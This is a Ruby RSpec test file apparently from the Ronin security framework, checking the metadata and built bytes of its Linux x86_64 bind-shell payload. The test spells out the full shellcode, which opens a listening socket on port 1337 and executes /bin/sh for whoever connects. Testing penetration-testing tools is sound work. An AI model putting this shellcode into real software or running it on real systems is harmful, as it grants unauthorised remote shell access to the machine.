require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/x86_64/bind_shell'

describe Ronin::Payloads::Shellcode::Linux::X86_64::BindShell do
  it "must inherit from Ronin::Payloads::Shellcode::BindShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::BindShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/x86_64/bind_shell'" do
      expect(subject.id).to eq('shellcode/linux/x86_64/bind_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    let(:packed_port) { "\x05\x39".b }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01#{packed_port}\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
